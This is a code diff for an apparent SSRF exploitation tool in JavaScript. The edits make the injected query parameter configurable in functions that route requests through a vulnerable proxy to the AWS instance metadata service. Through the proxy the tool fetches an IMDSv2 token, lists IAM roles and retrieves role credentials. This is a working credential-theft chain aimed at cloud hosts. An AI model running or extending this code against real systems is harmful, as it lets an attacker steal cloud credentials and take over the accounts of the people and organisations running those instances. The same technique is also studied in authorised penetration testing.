@@ -10,7 +10,7 @@ export async function testSSRFVulnerability(proxyUrl) {
 
   try {
     const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
-    const fullUrl = `${proxyUrl}?url=${testUrl}`;
+    const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${testUrl}`;
 
     logInfo(`Testing: ${fullUrl}`);
 
@@ -57,7 +57,7 @@ export async function testSSRFVulnerability(proxyUrl) {
 
 export async function fetchIMDSv2Token(proxyUrl) {
   const tokenUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.token}`;
-  const fullUrl = `${proxyUrl}?url=${tokenUrl}`;
+  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${tokenUrl}`;
 
   try {
     const response = await axios.put(fullUrl, null, {
@@ -75,7 +75,7 @@ export async function fetchIMDSv2Token(proxyUrl) {
 
 export async function fetchIAMRole(proxyUrl, token) {
   const metadataUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}`;
-  const fullUrl = `${proxyUrl}?url=${metadataUrl}`;
+  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
 
   try {
     const response = await axios.get(fullUrl, {
@@ -93,7 +93,7 @@ export async function fetchIAMRole(proxyUrl, token) {
 
 export async function fetchAllIAMRoles(proxyUrl, token) {
   const metadataUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}`;
-  const fullUrl = `${proxyUrl}?url=${metadataUrl}`;
+  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
 
   try {
     const response = await axios.get(fullUrl, {
@@ -118,7 +118,7 @@ export async function fetchAllIAMRoles(proxyUrl, token) {
 
 export async function fetchCredentials(proxyUrl, token, role) {
   const credentialsUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}/${role}`;
-  const fullUrl = `${proxyUrl}?url=${credentialsUrl}`;
+  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${credentialsUrl}`;
 
   try {
     const response = await axios.get(fullUrl, {
@@ -146,7 +146,7 @@ export async function fetchCredentials(proxyUrl, token, role) {
 
 export async function fetchIAMInfo(proxyUrl, token) {
   const iamInfoUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/iam/info`;
-  const fullUrl = `${proxyUrl}?url=${iamInfoUrl}`;
+  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${iamInfoUrl}`;
 
   try {
     const response = await axios.get(fullUrl, {
